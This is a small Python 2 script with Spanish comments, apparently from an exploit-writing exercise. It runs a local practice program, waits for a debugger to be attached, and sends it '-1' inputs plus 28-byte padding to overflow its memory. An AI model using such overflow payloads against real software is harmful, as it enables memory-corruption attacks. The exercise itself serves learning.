from subprocess import *
import struct
p = Popen([r'ConsoleApplication4.exe', 'f'], stdout=PIPE, stdin=PIPE, stderr=STDOUT)

print "ATACHEA EL DEBUGGER Y APRETA ENTER\n"
raw_input()

primera="-1\n"
p.stdin.write(primera)

fruta= fruta= 28* "A" + "\x01" +"\n"
p.stdin.write(fruta)

primera="-1\n"
p.stdin.write(primera)

fruta= fruta= 28* "A" + "\x01" +"\n"
p.stdin.write(fruta)

testresult = p.communicate()[0]


print(testresult)


